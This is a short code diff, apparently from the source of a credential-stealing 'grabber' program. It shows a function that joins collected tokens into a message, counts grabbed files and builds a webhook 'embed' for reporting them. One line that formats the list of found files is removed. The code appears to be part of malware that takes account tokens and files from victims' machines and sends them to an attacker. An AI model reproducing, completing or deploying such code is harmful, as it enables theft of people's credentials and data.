@@ -1937,7 +1937,6 @@ class hwkish_first_funct(Functions):
         for tkn in self.hawked:
             tokens += f"{tkn}\n\n"
         fileCount = f"{file_count} {hwkish}-{grbber} FILES: "
-        files_found = " ".join([file.strip().replace("_", " ") for file in files_found.split() if not file.endswith((".dat", ".json"))])
 
         embed = {
             "username": f"{hwkish}-{grbber}",
